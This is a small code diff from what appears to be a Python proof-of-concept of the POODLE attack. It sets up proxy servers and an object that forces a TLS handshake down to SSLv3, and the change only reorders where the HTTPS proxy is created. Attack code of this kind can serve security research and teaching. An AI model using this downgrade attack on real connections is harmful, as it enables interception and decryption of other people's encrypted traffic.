@@ -38,9 +38,9 @@ def poodle_handler(key, client_ip, server_ip):
 
 logging.basicConfig(stream=sys.stdout, level=logging.WARN)
 
+https_server = HTTPSProxyServer(port = 8443)
 http_server = HTTPProxyServer(port = 8080)
 force_request = ForceRequest(http_server)
-https_server = HTTPSProxyServer(port = 8443)
 
 downgrade_attack = AlterHandshake(https_server)
 downgrade_attack.downgrade_tls_version(TLSVersion.SSLv3)
